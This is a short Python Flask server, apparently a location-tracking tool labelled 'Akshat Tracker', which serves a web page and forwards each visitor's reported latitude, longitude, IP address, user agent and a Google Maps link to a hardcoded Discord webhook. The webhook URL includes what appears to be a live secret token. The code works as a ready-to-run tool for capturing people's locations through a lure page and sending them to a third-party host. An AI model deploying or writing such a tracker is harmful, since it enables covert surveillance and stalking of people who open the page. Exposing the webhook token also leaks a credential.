from flask import Flask, request, send_from_directory, jsonify
import requests
import os

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1521185686709862623/IT5aYe_AA002gG5AwQ6Qrg_8ctPm-Q87gr6vhLtajqkoTP_rxi_Tn5U9I0I-JHRRYyTu"

@app.route('/')
def index():
    with open('index.html', 'r') as f:
        return f.read()

@app.route('/capture-location', methods=['POST'])
def capture_location():
    try:
        data = request.get_json()
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        location_info = f"""
**🔔 New Location Captured!**

**Time:** {data.get('timestamp')}
**Latitude:** {lat}
**Longitude:** {lon}
**Maps:** https://www.google.com/maps?q={lat},{lon}
**IP Info:** {request.remote_addr}
**User-Agent:** {data.get('userAgent')}
        """

        payload = {
            "content": location_info,
            "username": "Akshat Tracker"
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        print("✅ Location sent successfully")
        return jsonify({"status": "success"})
    except Exception as e:
        print("❌ Error:", e)
        return jsonify({"status": "error"}), 500

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
